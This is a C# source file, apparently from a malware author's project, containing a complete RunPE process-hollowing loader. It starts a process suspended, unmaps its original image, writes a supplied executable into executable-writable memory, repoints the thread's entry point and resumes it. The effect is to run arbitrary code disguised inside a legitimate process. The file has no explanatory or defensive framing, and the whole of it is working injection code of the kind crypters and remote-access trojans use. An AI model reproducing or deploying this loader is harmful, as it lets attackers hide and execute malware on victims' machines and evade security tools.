using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

//Developer İntrusive
//Developer İntrusive
//Developer İntrusive
//Developer İntrusive
//Developer İntrusive

namespace intrusive
{
    public static class ömer
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool CreateProcess_API(string applicationName, string commandLine, System.IntPtr processAttributes, System.IntPtr threadAttributes, bool inheritHandles, uint creationFlags, System.IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool GetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64GetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool SetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64SetThreadContext_API(System.IntPtr thread, int[] context);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool ReadProcessMemory_API(System.IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern bool WriteProcessMemory_API(System.IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [System.Runtime.InteropServices.DllImport("ntdll.dll", EntryPoint = "UnmapViewOfSection")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern int NtUnmapViewOfSection_API(System.IntPtr process, int baseAddress);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern int VirtualAllocEx_API(System.IntPtr handle, int address, int length, int type, int protect);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
        [System.Security.SuppressUnmanagedCodeSecurity]
        private static extern int ResumeThread_API(System.IntPtr handle);
        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public System.IntPtr HasanHandle;
            public System.IntPtr TihradHandle;
            public uint _processıd;
            public uint _threadıd;
        } // PROCESS_INFORMATION

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size_;
            public string _reversed1s_;
            public string _desktop_;
            public string _title_;

            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int FLAGSS;
            public short wShowWindow;
            public short cbReserved2;
            public System.IntPtr Reserved2;
            public System.IntPtr StdInput;
            public System.IntPtr StdOutput;
            public System.IntPtr StdError;
        } 

        public static bool Run(string path, string cmd, byte[] data, bool compatible)
        {
            for (int fri = 1; fri <= 5; fri++)
            {
                if (HandleRun(path, cmd, data, compatible))
                    return true;
            }

            return false;
        } // Run
        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            int ReadWrite = 0;
            string QuotedPath = string.Format("\"{0}\"", path);

            STARTUP_INFORMATION SI = new STARTUP_INFORMATION();
            PROCESS_INFORMATION PI = new PROCESS_INFORMATION();

            SI.FLAGSS = 0;
            SI.Size_ = System.Convert.ToUInt32(System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUP_INFORMATION)));

            try
            {
                if (!string.IsNullOrEmpty(cmd))
                    QuotedPath = QuotedPath + " " + cmd;

                if (!CreateProcess_API(path, QuotedPath, System.IntPtr.Zero, System.IntPtr.Zero, false, 4, System.IntPtr.Zero, null, ref SI, ref PI))
                    throw new System.Exception();

                int FileAddress = System.BitConverter.ToInt32(data, 60);
                int ImageBase = System.BitConverter.ToInt32(data, FileAddress + 52);

                int[] Context_ = new int[179];
                Context_[0] = 65538;

                if (System.IntPtr.Size == 4)
                {
                    if (!GetThreadContext_API(PI.TihradHandle, Context_))
                        throw new System.Exception();
                }
                else if (!Wow64GetThreadContext_API(PI.TihradHandle, Context_))
                    throw new System.Exception();

                int Ebx = Context_[41];
                int BaseAddress = 0;

                if (!ReadProcessMemory_API(PI.HasanHandle, Ebx + 8, ref BaseAddress, 4, ref ReadWrite))
                    throw new System.Exception();

                if (ImageBase == BaseAddress)  //Developer İntrusive
                {
                    if (!(NtUnmapViewOfSection_API(PI.HasanHandle, BaseAddress) == 0))
                        throw new System.Exception();
                }

                int SizeOfImage = System.BitConverter.ToInt32(data, FileAddress + 80);
                int SizeOfHeaders = System.BitConverter.ToInt32(data, FileAddress + 84);

                bool AllowOverride = false;
                int NewImageBase = VirtualAllocEx_API(PI.HasanHandle, ImageBase, SizeOfImage, 12288, 64); // R1  //Developer İntrusive

		//Developer İntrusive   //Developer İntrusive

                if (!compatible && NewImageBase == 0)
                {
                    AllowOverride = true;
                    NewImageBase = VirtualAllocEx_API(PI.HasanHandle, 0, SizeOfImage, 12288, 64);
                }

                if (NewImageBase == 0)
                    throw new System.Exception();


                if (!WriteProcessMemory_API(PI.HasanHandle, NewImageBase, data, SizeOfHeaders, ref ReadWrite))
                    throw new System.Exception();

                int SectionOffset = FileAddress + 248;
                short NumberOfSections = System.BitConverter.ToInt16(data, FileAddress + 6);

                for (int fri = 0; fri <= NumberOfSections - 1; fri++)
                {
                    int VirtualAddress = System.BitConverter.ToInt32(data, SectionOffset + 12);
                    int SizeOfRawData = System.BitConverter.ToInt32(data, SectionOffset + 16);
                    int PointerToRawData = System.BitConverter.ToInt32(data, SectionOffset + 20);

                    if (!(SizeOfRawData == 0))
                    {
                        byte[] SectionData = new byte[SizeOfRawData - 1 + 1];
                        System.Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length);

                        if (!WriteProcessMemory_API(PI.HasanHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ref ReadWrite))
                            throw new System.Exception();
                    }

                    SectionOffset += 40;
                }

                byte[] PointerData = System.BitConverter.GetBytes(NewImageBase);
                if (!WriteProcessMemory_API(PI.HasanHandle, Ebx + 8, PointerData, 4, ref ReadWrite))
                    throw new System.Exception();

                int AddressOfEntryPoint = System.BitConverter.ToInt32(data, FileAddress + 40);

                if (AllowOverride)
                    NewImageBase = ImageBase;
                Context_[44] = NewImageBase + AddressOfEntryPoint;

                if (System.IntPtr.Size == 4)
                {
                    if (!SetThreadContext_API(PI.TihradHandle, Context_))
                        throw new System.Exception();
                }
                else if (!Wow64SetThreadContext_API(PI.TihradHandle, Context_))
                    throw new System.Exception();

                if (ResumeThread_API(PI.TihradHandle) == -1)
                    throw new System.Exception();
            }
            catch
            {
                System.Diagnostics.Process Pros = System.Diagnostics.Process.GetProcessById(System.Convert.ToInt32(PI._processıd));
                if (Pros != null)
                    Pros.Kill();

                return false;
            }

            return true;
        }
    }

}

//Developer İntrusive
//Developer İntrusive
//Developer İntrusive
//Developer İntrusive